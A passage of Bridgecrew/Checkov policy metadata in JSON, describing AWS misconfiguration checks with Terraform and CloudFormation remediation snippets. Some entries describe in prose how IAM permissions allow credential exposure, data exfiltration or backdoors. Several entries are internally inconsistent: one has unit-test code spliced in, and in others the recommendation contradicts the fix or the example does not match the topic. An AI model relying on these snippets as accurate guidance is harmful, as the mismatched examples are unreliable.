        "description": "AWS SageMaker notebook instance is not configured with data encryption at rest using KMS key\nDescription\nThis is a straight-forward check to ensure data encryption for Sagemaker notebooks, this check verifies that the cluster is encrypted with a Customer managed Key (CMK).\nFix - Runtime\nAWS Console\nThere is no current way of enabling encryption on an existing notebook, it will need to be recreated.\nFix - Buildtime\nTerraform\n\nResource:  aws_sagemaker_endpoint_configuration\nArgument: kms_key_arn, specifying a KMS key will ensure data encryption.\n\nThis modification will result in the resource being recreated.\naws_sagemaker_endpoint_configuration.examplea.tfresource \"aws_sagemaker_endpoint_configuration\" \"example\" {\n  ...\n  name        = \"my-endpoint-config\"\n+ kms_key_arn = aws_kms_key.examplea.arn\n  production_variants {\n    variant_name           = \"variant-1\"\n    model_name             = aws_sagemaker_model.examplea.name\n    initial_instance_count = 1\n    instance_type          = \"ml.t2.medium\"\n  }\n  ...\n}\n",
        "severity": "HIGH"
    },
    "CKV2_AWS_12": {
        "url": "https://docs.bridgecrew.io/docs/networking_4",
        "description": "AWS Default Security Group does not restrict all traffic\nDescription\nA VPC comes with a default security group that has an initial setting denying all inbound traffic, allowing all outbound traffic, and allowing all traffic between instances assigned to the security group. If you do not specify a security group when you launch an instance, the instance is automatically assigned to this default security group. Security groups are stateful and provide filtering of ingress/egress network traffic to AWS resources. \nWe recommend that your default security group restricts all inbound and outbound traffic. The default VPC in every region should have its default security group updated to comply with this recommendation. Any newly created VPCs will automatically contain a default security group that will need remediation to comply with this recommendation.\nConfiguring all VPC default security groups to restrict all traffic will encourage least privilege security group development and mindful placement of AWS resources into security groups. This in-turn reduces the exposure of those resources.\n\ud83d\udcd8NoteWhen implementing this recommendation, VPC flow logging is invaluable in determining the least privilege port access required by systems to work properly.  VPC flow logging can log all packet acceptances and rejections occurring under the current security groups. This dramatically reduces the primary barrier to least privilege engineering, discovering the minimum ports required by systems in the environment. Even if the VPC flow logging recommendation described is not adopted as a permanent security measure, it should be used during any period of discovery and engineering for least privileged security groups.\nFix - Runtime \nProcedure\nSecurity Group Members: \nTo implement the prescribed state, follow these steps:\n\nIdentify AWS resources that exist within the default security group.\nCreate a set of least privilege security groups for those resources.\nPlace the resources in those security groups.\nRemove the resources noted in Step 1 from the default security group. \n\nAWS Console\nSecurity Group State\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon VPC console.\nRepeat the next steps for all VPCs, including the default VPC in each AWS region:\na) In the left pane, click Security Groups.\nb) For each default security group, perform the following:\ni) Select the default security group.\nii) Click Inbound Rules.\niii) Remove any inbound rules.\niv) Click Outbound Rules.\nv) Remove any outbound rules.\n\nFix - Buildtime \nTerraform\n\nResources: aws_default_security_group + aws_vpc\nArgument: vpc_id (of aws_default_security_group)\n\nGoresource \"aws_default_security_group\" \"default\" {\n  vpc_id = aws_vpc.ok_vpc.id\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_99": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_41",
        "description": "AWS Glue security configuration encryption is not enabled\nDescription\nEnsure that AWS Glue has encryption enabled. AWS glue has three possible components that could be encrypted: Cloudwatch, job bookmarks and S3 buckets. This check ensures that each is set correctly.\nFix - Runtime\nAWS Console\nTBA\nFix - Buildtime\nTerraform\n\nResource:  aws_glue_security_configuration\nArguments: encryption_configuration, job_bookmarks_encryption, s3_encryption\n\naws_glue_security_configuration.test.tfresource \"aws_glue_security_configuration\" \"test\" {\n  name = \"example\"\n    ...\n+ encryption_configuration {\n+   cloudwatch_encryption {\n+     cloudwatch_encryption_mode = \"SSE-KMS\"\n+     kms_key_arn        = aws_kms_key.example.arn\n+   }\n\n+   job_bookmarks_encryption {\n+     job_bookmarks_encryption_mode = \"CSE-KMS\"\n+     kms_key_arn        = aws_kms_key.example.arn\n+   }\n\n+   s3_encryption {\n+     kms_key_arn        = aws_kms_key.example.arn\n+     s3_encryption_mode = \"SSE-KMS\"\n+   }\n+ }\n}\n\nCloudFormation\n\nResource:  AWS::Glue::SecurityConfiguration\nArguments: Properties.EncryptionConfiguration\n\nYAMLResources:\n  Resource0:\n    Type: AWS::Glue::SecurityConfiguration\n    Properties:\n      ...\n      EncryptionConfiguration:\n        CloudWatchEncryption: \n+         CloudWatchEncryptionMode: SSE-KMS #any value but 'DISABLED'\n          ...\n        JobBookmarksEncryption: \n+         JobBookmarksEncryptionMode: CSE-KMS #any value but 'DISABLED'\n          ...\n        S3Encryptions: \n+         S3EncryptionMode: SSE-KMS #any value but 'DISABLED'\n          ...\n",
        "severity": "HIGH"
    },
    "CKV_AWS_100": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_kubernetes_5",
        "description": "Ensure AWS EKS node group does not have implicit SSH access from 0.0.0.0/0\nDescription\nIt is generally a good security practice to ensure that your AWS EKS node group does not have implicit SSH access from 0.0.0.0/0, as this means that it is not accessible over the internet via SSH. This can help to protect your EKS node group from unauthorized access, as external parties will not be able to connect to it over the internet.\nFix - Buildtime \nTerraform\n\nResource: aws_eks_node_group\nArgument: remote_access/source_security_group_ids\nMakes sure there is no remote access block or the addition of source_security_group_ids\n\naws_eks_node_group.test.tfresource \"aws_eks_node_group\" \"test\" {\n  ...\n  cluster_name    = aws_eks_cluster.example.name\n  remote_access {\n    ec2_ssh_key = \"some-key\"\n+    source_security_group_ids = \"some-group\"\n  }\n}\n\nCloudFormation\n\nResource: AWS::EKS::Nodegroup\nArgument: Properties.RemoteAccess\n\nYAMLResources:\n  Nodegroup1:\n    Type: 'AWS::EKS::Nodegroup'\n    Properties:\n      ...\n      RemoteAccess: \n        Ec2SshKey: <ssh key>\n+       SourceSecurityGroups: \n+         - ...\n\n  Nodegroup2:\n    Type: 'AWS::EKS::Nodegroup'\n    Properties:\n      ...\n-     RemoteAccess:\n-               ...\n",
        "severity": "HIGH"
    },
    "CKV_AWS_101": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_logging_24",
        "description": "Neptune logging is not enabled\nDescription\n These logs can be used to analyse traffic patterns and troubleshoot security and operational issues.\nIt is recommended that you set your cluster to optionally export its' logs to AWS Cloudwatch.\nFix - Runtime \nAWS Console\nTBA\nFix - Buildtime\nTerraform\n\nResource: aws_neptune_cluster\nArgument: enable_cloudwatch_logs_exports\n\nGoresource \"aws_neptune_cluster\" \"Pike\" {\n  cluster_identifier   = var.DBClusterIdentifier\n \n    ...\n+ enable_cloudwatch_logs_exports      = [\"audit\"]\n}\n\nCloudFormation\n\nResource: AWS::Neptune::DBCluster\nArgument: Properties.EnableCloudWatchLogExports\n\nYAMLType: \"AWS::Neptune::DBCluster\"\n    Properties:\n        ...\n+       EnableCloudwatchLogsExports: [\"audit\"]\n",
        "severity": "HIGH"
    },
    "CKV_AWS_102": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_42",
        "description": "Neptune cluster instance is publicly available\nDescription\nAmazon Neptune is a graph database service that for high-performance graph database engine. Neptune supports the popular graph query languages Apache TinkerPop Gremlin and W3C\u2019s SPARQL. \nNeptune also gives you the ability to create snapshots of your databases, which you can use later to restore a database. You can share a snapshot with a different Amazon Web Services account, and the owner of the recipient account can use your snapshot to restore a DB that contains your data. You can even choose to make your snapshots public \u2013 that is, anybody can restore a DB containing your data.\nThis is a check to make sure that your database resource is not Publicly available. This is the resources' default behaviour. https://docs.aws.amazon.com/neptune/latest/userguide/security-vpc.html. . \nFix - Runtime\nAWS Console\nFirst find your neptune instance id with the AWS commandline:\naws neptune describe-db-instances\n\nOnce you have your instance id you can unset its public status with:\naws neptune modify-db-instance aws neptune --db-instance-identifier <your db identifier> --no-publicly-accessible\n\nFix - Buildtime\nTerraform\n\nResource:  aws_neptune_cluster_instance\nArgument:  publicly_accessible this default to false, so the check is to ensure it's missing or false.\n\naws_neptune_cluster_instance.example.tfresource \"aws_neptune_cluster_instance\" \"example\" {\n  count              = 2\n  cluster_identifier = aws_neptune_cluster.default.id\n  engine             = \"neptune\"\n  instance_class     = \"db.r4.large\"\n  apply_immediately  = true\n}\n",
        "severity": "HIGH"
    },
    "CKV2_AWS_44": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-route-table-with-vpc-peering-does-not-contain-routes-overly-permissive-to-all-traffic",
        "description": "AWS route table with VPC peering overly permissive to all traffic\nDescription\nThis policy identifies VPC route tables with VPC peering connection  which are overly permissive to all traffic. Being highly selective in peering routing tables is a very effective way of minimizing the impact of breach as resources outside of these routes are inaccessible to the peered VPC.\nFix - Buildtime\nTerraform\nGoresource \"aws_route\" \"aws_route_pass_1\" {\n  route_table_id            = \"rtb-4fbb3ac4\"\n  destination_cidr_block    = \"10.0.1.0/22\"\n  vpc_peering_connection_id = \"pcx-45ff3dc1\"\n}\n",
        "severity": "HIGH"
    },
    "CKV_AWS_107": {
        "url": "https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-credentials-exposure",
        "description": "Credentials exposure actions return credentials in an API response\nDescription\nAWS IAM users access AWS resources using different types of credentials, such as passwords or access keys. Credentials Exposure actions return credentials as part of the API response, such as ecr:GetAuthorizationToken, iam:UpdateAccessKey, and others.\nFor more info, visit cloudsplaning documentation\nhttps://cloudsplaining.readthedocs.io/en/latest/glossary/credentials-exposure/\nFix - Buildtime \nTerraform\n\nResource: aws_iam_policy_document\nArgument: effect + actions\n\nGodata \"aws_iam_policy_document\" \"example\" {\n  statement {\n    sid = \"1\"\n    effect = \"Allow\"\n    actions = [\n      \"lambda:CreateFunction\",\n      \"lambda:CreateEventSourceMapping\",\n      \"dynamodb:CreateTable\",\n    ]\n    resources = [\n      \"*\",\n    ]\n  }\n}\n\nCloudFormation\n\nResource: AWS::IAM::Policy / AWS::IAM::ManagedPolicy / AWS::IAM::Group /\nAWS::IAM::Role / AWS::IAM::User  \nArgument: Effect + Actions\n\nYAMLResources:\n  AdminDeny:\n    Type: 'AWS::IAM::ManagedPolicy'\n    Properties:\n      ...\n      PolicyDocument:\n        ...\n        Statement:\n          - Effect: Allow\n            Action: \n            -   'lambda:CreateFunction'\n                    -   'lambda:CreateEventSourceMapping'\n                -   'dynamodb:CreateTable'\n            Resource: '*'\n",
        "severity": "LOW"
    },
    "CKV_AWS_108": {
        "url": "https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-data-exfiltration",
        "description": "Data exfiltration allowed without resource constraints\nDescription\nData Exfiltration actions allow certain read-only IAM actions without resource constraints, such as s3:GetObject, ssm:GetParameter*, or secretsmanager:GetSecretValue.\n1 - Unrestricted s3:GetObject permissions has a long history of customer data leaks\n2 - ssm:GetParameter* and secretsmanager:GetSecretValue are both used to access secrets.\n3 - rds:CopyDBSnapshot and rds:CreateDBSnapshot can be used to exfiltrate RDS database contents.\nFor more information, visit the cloudsplaining documentation\nhttps://cloudsplaining.readthedocs.io/en/latest/glossary/data-exfiltration/\nFix - Buildtime \nTerraform\n\nResource: aws_iam_policy_document\nArgument: effect + actions\n\nGodata \"aws_iam_policy_document\" \"example\" {\n              statement {\n                sid = \"1\"\n                effect = \"Allow\"\n                actions = [\n                    \"lambda:CreateFunction\",\n                    \"lambda:CreateEventSourceMapping\",\n                    \"dynamodb:CreateTable\",\n                ]\n                resources = [\n                  \"*\",\n                ]\n              }\n            }\n\nCloudFormation\n\nResource: AWS::IAM::ManagedPolicy\nArgument: Effect + Actions\n\nYAMLType: 'AWS::IAM::ManagedPolicy'\n    Properties:\n      ...\n      PolicyDocument:\n        ...\n        Statement:\n          - Effect: Allow\n            Action: \n            -   'lambda:CreateFunction'\n            -   'lambda:CreateEventSourceMapping'\n            -   'dynamodb:CreateTable'\n            Resource: '*'\n",
        "severity": "INFO"
    },
    "CKV_AWS_109": {
        "url": "https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-permissions-management-resource-exposure-without-constraint",
        "description": "Resource exposure allows modification of policies and exposes resources\nDescription\nThis policy allows actions that permit modification of resource-based policies or can otherwise can expose AWS resources to the public via similar actions that can lead to resource exposure.\nFor example:\n1 - s3:PutBucketPolicy, s3:PutBucketAcl, and s3:PutObjectAcl grant permissions to modify the properties of S3 buckets or objects for new or existing objects in an S3 bucket, which could expose objects to rogue actors or to the internet.\n2 - ecr:SetRepositoryPolicy could allow an attacker to exfiltrate container images (which sometimes unintentionally contain secrets and non-public information), tamper with container images, or otherwise modify.\n3 - iam:UpdateAssumeRolePolicy could allow an attacker to create a backdoor by assuming a privileged role in the victim account from an external account.\nThe ability to modify AWS Resource Access Manager, which could allow a malicious actor to share a VPC hosting sensitive or internal services to rogue AWS accounts\nAttackers can easily exploit Resource Exposure permissions to expose resources to rogue users or the internet, as shown by endgame, an AWS pentesting tool that was also released by Salesforce.\nFor more info, visit cloudsplaning documentation\nhttps://cloudsplaining.readthedocs.io/en/latest/glossary/resource-exposure/\nFix - Buildtime \nTerraform\n\nResource: aws_iam_policy_document\nArgument: effect + actions\n\nGodata \"aws_iam_policy_document\" \"example\" {\n  statement {\n    sid = \"1\"\n    effect = \"Allow\"\n    actions = [\n      \"s3:*\"\n    ]     \n    resources = [\n      \"foo\",\n    ]\n  }\n}\n\nCloudFormation\n\nResource: aws_iam_policy_document\nArgument: effect + actions\n\nYAMLType: 'AWS::IAM::ManagedPolicy'\n    Properties:\n      ...\n      PolicyDocument:\n        ...\n        Statement:\n          - Effect: Allow\n            Action: \n            - 's3:*'\n            Resource: 'foo'\n",
        "severity": "LOW"
    },
    "CKV_AWS_111": {
        "url": "https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-write-access-without-constraint",
        "description": "Write access allowed without constraint\nDescription\nThis policy allows actions that permit modification of resource-based policies or can otherwise can expose AWS resources to the public via similar actions that can lead to resource exposure.\nFor example:\n1 - s3:PutBucketPolicy, s3:PutBucketAcl, and s3:PutObjectAcl grant permissions to modify the properties of S3 buckets or objects for new or existing objects in an S3 bucket, which could expose objects to rogue actors or to the internet.\n2 - ecr:SetRepositoryPolicy could allow an attacker to exfiltrate container images (which sometimes unintentionally contain secrets and non-public information), tamper with container images, or otherwise modify.\n3 - iam:UpdateAssumeRolePolicy could allow an attacker to create a backdoor by assuming a privileged role in the victim account from an external account.\nThe ability to modify AWS Resource Access Manager, which could allow a malicious actor to share a VPC hosting sensitive or internal services to rogue AWS accounts\nAttackers can easily exploit Resource Exposure permissions to expose resources to rogue users or the internet, as shown by endgame, an AWS pentesting tool that was also released by Salesforce.\nFor more info, visit cloudsplaning documentation\nhttps://cloudsplaining.readthedocs.io/en/latest/glossary/resource-exposure/\nFix - Buildtime \nTerraform\n\nResource: aws_iam_policy_document\n*Argument: effect + actions\n\nGodata \"aws_iam_policy_document\" \"example\" {\n              statement {\n                sid = \"1\"\n                effect = \"Allow\"\n                actions = [\n                        \"s3:*\"\n                ]\n            \n                resources = [\n                  \"foo\",\n                ]\n              }\n            }\n",
        "severity": "LOW"
    },
    "CKV_AWS_113": {
        "url": "https://docs.bridgecrew.io/docs/ensure-session-manager-logs-are-enabled-and-encrypted",
        "description": "Session Manager logs are not enabled or encrypted\nDescription\nEncrypting your ession Manager logs helps protect your data from unauthorized access or tampering. That way, you can ensure that only authorized users can access and modify the contents of your logs. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime\nTerraform\nResource: aws_ssm_document\nArgument: cloudWatchStreamingEnabled\naws_rds_cluster_parameter_group.examplea.tfresource \"aws_ssm_document\" \"s3_enabled_encrypted\" {\n  name          = \"SSM-SessionManagerRunShell\"\n  document_type = \"Session\"\n\n  content = <<DOC\n  {\n    \"schemaVersion\": \"1.0\",\n    \"description\": \"Document to hold regional settings for Session Manager\",\n    \"sessionType\": \"Standard_Stream\",\n    \"inputs\": {\n      \"s3BucketName\": \"example\",\n      \"s3KeyPrefix\": \"\",\n      \"s3EncryptionEnabled\": true,\n      \"cloudWatchLogGroupName\": \"\",\n      \"cloudWatchEncryptionEnabled\": true,\n      \"idleSessionTimeout\": \"20\",\n      \"cloudWatchStreamingEnabled\": true,\n      \"kmsKeyId\": \"\",\n      \"runAsEnabled\": false,\n      \"runAsDefaultUser\": \"\",\n      \"shellProfile\": {\n        \"windows\": \"\",\n        \"linux\": \"\"\n      }\n    }\n  }\nDOC\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_114": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-emr-clusters-have-kerberos-enabled",
        "description": "AWS EMR cluster is not configured with Kerberos authentication\nDescription\nEnsuring that the Kerberos Realm is set can help to improve the security of your EMR clusters by allowing you to more effectively manage and control access to your clusters. For example, you can use the Kerberos Realm to specify which users and groups are allowed to access your clusters, and which actions they are allowed to perform.\nFix - Buildtime \nTerraform\n\nResource: aws_emr_cluster\nArgument: kerberos_attributes.realm \n\nGoresource \"aws_emr_cluster\" \"test\" {\n...\n  kerberos_attributes {\n    kdc_admin_password                = \"somePassword\"\n+   realm                             = \"EC2.INTERNAL\"\n    }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_115": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-for-function-level-concurrent-execution-limit",
        "description": "AWS Lambda function is not configured for function-level concurrent execution Limit\nDescription\nAdding concurrency to Lambda initializes that number of execution environments for multiple parallel requests at low latency. However, this could spike costs and open the door for abuse. Adding concurrency limits can prevent a rapid spike in usage and costs, while also increasing or lowering the default concurrency limit.\nFix - Buildtime \nTerraform\n\nResource: aws_lambda_function\nArgument: reserved_concurrent_executions\n\nGoresource \"aws_lambda_function\" \"example\" {\n   ...\n+  reserved_concurrent_executions = 100\n}\n\nCloudFormation\n\nResources: AWS::Lambda::Function, AWS::Serverless::Function\nArgument: Properties/ReservedConcurrentExecutions\n\nType: AWS::Lambda::Function\nProperties: \n  ...\n  ReservedConcurrentExecutions: 100\n  ...\n",
        "severity": "LOW"
    },
    "CKV_AWS_116": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-for-a-dead-letter-queue-dlq",
        "description": "AWS Lambda function is not configured for a DLQ\nDescription\nSetting up a DLQ offers the possibility to investigate errors or failed requests to the connected Lambda function.\nAs an alternative it is possible to configure an on-failure destination target, which forwards a failed event to a DLQ, SNS Topic, Lambda function or EventBridge.\nIt is always important to understand why your application/function failed and to ensure that no data was dropped or compromised. Lambda functions are often used to process security related data like CloudTrail events and a failed delivery to a dependent system can result in an unnoticed security breach.\nFix - Buildtime \nTerraform\n\nResource: aws_lambda_function\nArgument: dead_letter_config\n\nGoresource \"aws_lambda_function\" \"test_lambda\" {\n  ...   \n+ dead_letter_config {\n+   target_arn = \"test\"\n+ }\n}\n\nCloudFormation\n\nResource: AWS::Lambda::Function\nArgument: Properties.DeadLetterConfig\n\nYAMLType: AWS::Lambda::Function\nProperties:\n  ...\n+ DeadLetterConfig:\n+   TargetArn: \"test\"\n",
        "severity": "LOW"
    },
    "CKV_AWS_117": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-inside-a-vpc-1",
        "description": "AWS Lambda Function is not assigned to access within VPC\nDescription\nBy default, Lambda runs functions in a secure VPC with access to AWS services and the internet. Lambda owns this VPC, which isn't connected to the account's default VPC. Internet access from a private subnet requires Network Address Translation (NAT). \nTo give your function access to the internet, route outbound traffic to a NAT gateway in a public subnet.\nFix - Buildtime \nTerraform\n\nResource: aws_lambda_function\nArgument: vpc_config.subnet_ids\nFor network connectivity to AWS resources in a VPC, specify a list of security groups and subnets in the VPC. When you connect a function to a VPC, it can only access resources and the internet through that VPC.\nsubnet_ids - List of subnet IDs associated with the Lambda function.\nNote: If both subnet_ids and security_group_ids are empty then vpc_config is considered to be empty or unset.\n\nGoresource \"aws_lambda_function\" \"test_lambda\" {\n  ...\n  vpc_config {\n    // Every subnet should be able to reach an EFS mount target in the same Availability Zone. \n    // Cross-AZ mounts are not permitted.\n+   subnet_ids         = [aws_subnet.subnet_for_lambda.id]\n    security_group_ids = [aws_security_group.sg_for_lambda.id]\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_118": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-enhanced-monitoring-is-enabled-for-amazon-rds-instances",
        "description": "Enhanced monitoring for Amazon RDS instances is disabled\nDescription\nEnabling enhanced monitoring for Amazon RDS instances can provide you with additional visibility into the performance and health of your database instances. With enhanced monitoring, you can retrieve real-time performance metrics for your RDS instances at intervals of 1 second, rather than the standard interval of 60 seconds. This can be particularly useful for troubleshooting performance issues, identifying trends in resource utilization, and detecting potential issues before they become problems. \nFix - Buildtime \nTerraform\n\nResource: aws_db_instance\nArgument: monitoring_interval\n\nGoresource \"aws_db_instance\" \"default\" {\n  allocated_storage    = 10\n  ...\n+ monitoring_interval  = 5\n  }\n",
        "severity": "LOW"
    },
    "CKV_AWS_119": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-dynamodb-tables-are-encrypted",
        "description": "Unencrypted DynamoDB tables\nDescription\nEncrypting your Amazon DynamoDB helps protect your data from unauthorized access or tampering. That way, you can ensure that only authorized users can access and modify the contents of your DBs. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: aws_dynamodb_table\nArgument: server_side_encryption\n\nGoresource \"aws_dynamodb_table\" \"basic-dynamodb-table\" {\n  ...\n  server_side_encryption {\n+    enabled = true\n+    kms_key_arn= aws_kms_key.dynamo.arn\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_122": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-direct-internet-access-is-disabled-for-an-amazon-sagemaker-notebook-instance",
        "description": "AWS SageMaker notebook instance is not configured with direct internet access feature\nDescription\nWe recommend that Direct Internet Access is enabled for an Amazon SageMaker Notebook Instances.\nTBA. \nFix - Buildtime \nTerraform\n\nResource: aws_sagemaker_notebook_instance\nArgument: direct_internet_access\n\nGoresource \"aws_sagemaker_notebook_instance\" \"test\" {\n                  name          = \"my-notebook-instance\"\n                  role_arn      = aws_iam_role.role.arn\n                  instance_type = \"ml.t2.medium\"\n+                 direct_internet_access = \"Disabled\"\n                                  \n                  tags = {\n                    Name = \"foo\"\n                  }\n                }\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_123": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-vpc-endpoint-service-is-configured-for-manual-acceptance",
        "description": "VPC endpoint service is not configured for manual acceptance\nDescription\nConfiguring your VPC endpoint service for manual acceptance is recommended because it allows you to review and manually approve or reject incoming connection requests to your VPC. This can be useful for security purposes, as it gives you the ability to review and control which resources are able to connect to your VPC.\nBy default, VPC endpoint services are configured for automatic acceptance, which means that all incoming connection requests are automatically accepted and allowed to connect to your VPC. Configuring your VPC endpoint service for manual acceptance allows you to review and selectively approve or reject incoming connection requests, giving you more control over who can access your VPC.\nFix - Buildtime \nTerraform\n\nResource: aws_vpc_endpoint_service\nArgument: acceptance_required\n\nGoresource \"aws_vpc_endpoint_service\" \"example\" {\n        ...\n+   acceptance_required        = true\n    network_load_balancer_arns = [aws_lb.example.arn]\n }\n\nCloudFormation\n\nResource: AWS::EC2::VPCEndpointService\nArgument: Properties.AcceptanceRequired\n\nYAMLType: AWS::EC2::VPCEndpointService\n    Properties: \n        ...\n+     AcceptanceRequired: true\n",
        "severity": "LOW"
    },
    "CKV_AWS_124": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-cloudformation-stacks-are-sending-event-notifications-to-an-sns-topic",
        "description": "AWS CloudFormation stack configured without SNS topic\nDescription\nEnabling event notifications for your AWS CloudFormation stacks can help you to monitor and track changes to your stacks. When event notifications are enabled, CloudFormation will send a message to an Amazon Simple Notification Service (SNS) topic each time a stack event occurs. By doing so, you will improve your visibility and automation processes (if desired).\nFix - Buildtime \nTerraform\n\nResource: aws_cloudformation_stack\nArgument: notification_arns\n\nGoresource \"aws_cloudformation_stack\" \"default\" {\n    name = \"networking-stack\"\n    ...\n +  notification_arns = [\"arn1\", \"arn2\"]\n  }\n",
        "severity": "LOW"
    },
    "CKV_AWS_126": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-detailed-monitoring-is-enabled-for-ec2-instances",
        "description": "Detailed monitoring for EC2 instances is disabled\nDescription\nEnabling detailed monitoring for Amazon Elastic Compute Cloud (EC2) instances can provide you with additional data and insights about the performance and utilization of your instances. : Detailed monitoring can provide you with more data about the utilization of your instances, which can be helpful for capacity planning and optimization.\nFix - Buildtime \nTerraform\n\nResource: aws_instance\nArgument: monitoring\n\nGoresource \"aws_instance\" \"test\" {\n+  monitoring = true   \n }\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_127": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-elastic-load-balancers-uses-ssl-certificates-provided-by-aws-certificate-manager",
        "description": "Elastic load balancers do not use SSL Certificates provided by AWS Certificate Manager\nDescription\nSSL helps protect your data from unauthorized access or tampering by encrypting the data that is streamed via your ELB By enabling SSL, you can help ensure that only authorized users with the correct keys can access and decrypt the data, and that the data is protected while in transit.\nFix - Buildtime \nTerraform\n\nResource: aws_elb\nArgument: ssl_certificate_id\n\nGoresource \"aws_elb\" \"test\" {\n  ...\n  listener {\n    instance_port      = 8000\n    instance_protocol  = \"http\"\n    lb_port            = 443\n    lb_protocol        = \"https\"\n+   ssl_certificate_id = \"arn:aws:iam::123456789012:server-certificate/certName\"\n  }           \n}\n",
        "severity": "HIGH"
    },
    "CKV_AWS_129": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-respective-logs-of-amazon-relational-database-service-amazon-rds-are-enabled",
        "description": "Respective logs of Amazon RDS are disabled\nDescription\nIt is generally a good security practice to ensure that the respective logs of your Amazon RDS instances are enabled, as this can help you to monitor and track activity on your RDS instances. Logging can provide valuable information about the activity on your RDS instances, including details about connections, queries, and other types of events.\nFix - Buildtime \nTerraform\n\nResource: aws_db_instance\nArgument: enabled_cloudwatch_logs_exports\n\nGoresource \"aws_db_instance\" \"mysql\" {\n  allocated_storage = 5\n    ...\n+ enabled_cloudwatch_logs_exports = [\"general\", \"error\", \"slowquery\"]\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_133": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-rds-instances-have-backup-policy",
        "description": "AWS RDS instance without automatic backup setting\nDescription\nThis check examines the attribute backup_retention_period this should have a value 1-35, and checks if its set to 0 which would disable the backup.\nThis check is currently under review and maybe suppressed in future releases.\nFix - Runtime \nn/a\nFix - Buildtime \nTerraform\n\nResource: aws_rds_cluster\nArgument: backup_retention_period\n\nGoresource \"aws_rds_cluster\" \"test\" {\n  ...\n+ backup_retention_period = 35\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_138": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-elb-is-cross-zone-load-balancing-enabled",
        "description": "AWS ELB has cross-zone load balancing disabled\nDescription\nCross-zone load balancing reduces the need to maintain equivalent numbers of instances in each enabled Availability Zone, and improves your application's ability to handle the loss of one or more instances.\nThis would also guarantee better fault tolerance and more consistent traffic flow. If one of the availability zones registered with the ELB fails (as result of network outage or power loss), the load balancer with the Cross-Zone Load Balancing activated would act as a traffic guard, stopping any request being sent to the unhealthy zone and routing it to the other zones.\nFix - Buildtime \nTerraform\n\nResource: xyz\nArgument: xyz [this will be for composite checks and will indicate a specific resource]\n\nGoresource \"aws_elb\" \"test_success\" {\n              name               = \"foobar-terraform-elb\"\n              availability_zones = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n              access_logs {\n                bucket        = \"foo\"\n                bucket_prefix = \"bar\"\n                interval      = 60\n              }\n              listener {\n                instance_port     = 8000\n                instance_protocol = \"http\"\n                lb_port           = 80\n                lb_protocol       = \"http\"\n              }\n              listener {\n                instance_port      = 8000\n                instance_protocol  = \"http\"\n                lb_port            = 443\n                lb_protocol        = \"https\"\n                ssl_certificate_id = \"arn:aws:iam::123456789012:server-certificate/certName\"\n              }\n              health_check {\n                healthy_threshold   = 2\n                unhealthy_threshold = 2\n                timeout             = 3\n                target              = \"HTTP:8000/\"\n                interval            = 30\n              }\n              instances                   = [aws_instance.foo.id]\n              idle_timeout                = 400\n              connection_draining         = true\n              connection_draining_timeout = 400\n            }\n            \"\"\")\n        resource_conf = hcl_res['resource'][0]['aws_elb']['test_success']\n        scan_result = check.scan_resource_conf(conf=resource_conf)\n        self.assertEqual(CheckResult.PASSED, scan_result)\n\n    def test_success(self):\n        hcl_res = hcl2.loads(\"\"\"\n            resource \"aws_elb\" \"test_success\" {\n              name               = \"foobar-terraform-elb\"\n              availability_zones = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n              access_logs {\n                bucket        = \"foo\"\n                bucket_prefix = \"bar\"\n                interval      = 60\n              }\n              listener {\n                instance_port     = 8000\n                instance_protocol = \"http\"\n                lb_port           = 80\n                lb_protocol       = \"http\"\n              }\n              listener {\n                instance_port      = 8000\n                instance_protocol  = \"http\"\n                lb_port            = 443\n                lb_protocol        = \"https\"\n                ssl_certificate_id = \"arn:aws:iam::123456789012:server-certificate/certName\"\n              }\n              health_check {\n                healthy_threshold   = 2\n                unhealthy_threshold = 2\n                timeout             = 3\n                target              = \"HTTP:8000/\"\n                interval            = 30\n              }\n              instances                   = [aws_instance.foo.id]\n+             cross_zone_load_balancing   = true\n              idle_timeout                = 400\n              connection_draining         = true\n              connection_draining_timeout = 400\n            }\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_139": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-rds-clusters-and-instances-have-deletion-protection-enabled",
